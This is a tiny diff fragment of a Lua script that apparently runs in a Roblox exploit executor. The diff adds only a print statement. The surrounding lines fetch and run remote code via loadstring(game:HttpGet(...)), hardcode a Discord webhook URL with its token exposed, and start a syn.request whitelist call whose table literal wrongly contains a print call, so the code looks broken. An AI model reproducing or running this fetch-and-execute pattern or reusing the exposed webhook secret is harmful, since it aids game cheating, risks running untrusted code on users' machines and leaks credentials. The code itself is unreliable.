@@ -4,6 +4,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 
 local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1291098408676757554/qcaXarCaOIoIhQINjcXKfmauboXrl0XoSccT0vxI125l_mGfxqQ3bLpAXKFUw3NzwCB2"
+print("executer")
 
 local response = syn.request({
     print("WhiteListed"),
